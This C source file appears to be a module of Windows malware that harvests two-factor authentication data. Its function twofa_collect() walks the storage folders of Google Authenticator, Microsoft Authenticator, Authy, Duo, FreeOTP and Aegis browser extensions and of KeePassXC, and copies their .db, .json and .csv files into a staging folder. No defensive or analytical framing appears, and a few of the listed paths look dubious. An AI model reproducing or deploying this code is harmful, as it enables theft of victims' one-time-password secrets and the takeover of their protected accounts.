#include "twofa.h"
#include "config.h"
#include <windows.h>

#ifdef ENABLE_2FA_GOOGLE
#include <string.h>
#include <stdio.h>
#include <ctype.h>

#define TFA_MAX_PATH 512
#define TFA_MAX_FILES 256

/* ── Target extensions ────────────────────────────────────────── */

static int has_target_ext(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;
    dot++;
    if (_stricmp(dot, "db") == 0) return 1;
    if (_stricmp(dot, "json") == 0) return 1;
    if (_stricmp(dot, "csv") == 0) return 1;
    return 0;
}

/* ── Copy file via Win32 API ──────────────────────────────────── */

static int copy_file(const char *src, const char *dst) {
    HANDLE hIn = CreateFileA(src, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = GetFileSize(hIn, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hIn);
        return -1;
    }

    char *buf = (char *)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!buf) {
        CloseHandle(hIn);
        return -1;
    }

    DWORD read = 0;
    BOOL ok = ReadFile(hIn, buf, fileSize, &read, NULL);
    CloseHandle(hIn);
    if (!ok || read == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }

    HANDLE hOut = CreateFileA(dst, GENERIC_WRITE, 0,
                              NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, buf);
        return -1;
    }

    DWORD written = 0;
    ok = WriteFile(hOut, buf, read, &written, NULL);
    CloseHandle(hOut);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok ? 0 : -1;
}

/* ── Scan directory recursively and copy matching files ────────── */

static int scan_dir(const char *dir, const char *output_dir, size_t *count) {
    char pattern[TFA_MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;

    do {
        if (*count >= TFA_MAX_FILES) break;

        char fullpath[TFA_MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            /* skip . and .. */
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
                continue;
            /* recurse into subdirectories */
            scan_dir(fullpath, output_dir, count);
        } else {
            if (!has_target_ext(fd.cFileName)) continue;

            char dst_path[TFA_MAX_PATH];
            snprintf(dst_path, sizeof(dst_path), "%s\\%s", output_dir, fd.cFileName);

            /* avoid overwriting — append directory name to filename if exists */
            HANDLE hTest = CreateFileA(dst_path, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, 0, NULL);
            if (hTest != INVALID_HANDLE_VALUE) {
                CloseHandle(hTest);
                /* prefix with parent dir name */
                const char *parent = strrchr(dir, '\\');
                if (parent) parent++; else parent = "2fa";
                snprintf(dst_path, sizeof(dst_path), "%s\\%s_%s",
                         output_dir, parent, fd.cFileName);
            }

            if (copy_file(fullpath, dst_path) == 0)
                (*count)++;
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return 0;
}

/* ── Collect 2FA data from known authenticator paths ───────────── */

int twofa_collect(const char *output_dir) {
    if (!output_dir) return -1;

    CreateDirectoryA(output_dir, NULL);

    const char *local = getenv("LOCALAPPDATA");
    const char *roaming = getenv("APPDATA");

    /* 2FA authenticator storage locations */
    struct { const char *base; const char *sub; } targets[] = {
        /* Google Authenticator — browser extension local storage */
        { local,   "Google\\Authenticator" },
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\khcodhlfkpmhibicdjjblnkgimdepgnd" },
        /* Microsoft Authenticator */
        { local,   "Microsoft\\Authenticator" },
        { local,   "Microsoft\\Chrome\\User Data\\Default\\Local Extension Settings\\bfbdnbpibgndpjfhonkflpkijfapmomn" },
        /* Authy (Traktor) */
        { roaming, "Traktor\\authy" },
        { roaming, "Traktor" },
        { local,   "Authy" },
        /* Duo Mobile — browser extension */
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\eidlicjlkaiefdbgmdepmmicpbggmhoj" },
        /* OTP Auth — browser extension */
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bobfejfdlhnabgglompioclndjejolch" },
        /* FreeOTP — browser extension */
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\elokfmmmjbadpgdjmgglocapdckdcpkn" },
        /* Aegis Authenticator — browser extension */
        { local,   "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai" },
        /* KeePassXC — check for 2FA / TOTP files */
        { roaming, "KeePassXC" },
        { local,   "KeePassXC" },
        /* Generic: any Authenticator folder under Local AppData */
        { local,   "Authenticator" },
    };

    size_t count = 0;
    int ntargets = (int)(sizeof(targets) / sizeof(targets[0]));

    for (int i = 0; i < ntargets; i++) {
        const char *base = targets[i].base;
        const char *sub  = targets[i].sub;
        if (!base) continue;

        char dirpath[TFA_MAX_PATH];
        snprintf(dirpath, sizeof(dirpath), "%s\\%s", base, sub);

        scan_dir(dirpath, output_dir, &count);
        if (count >= TFA_MAX_FILES) break;
    }

    return (int)count;
}

#endif /* ENABLE_2FA_GOOGLE */
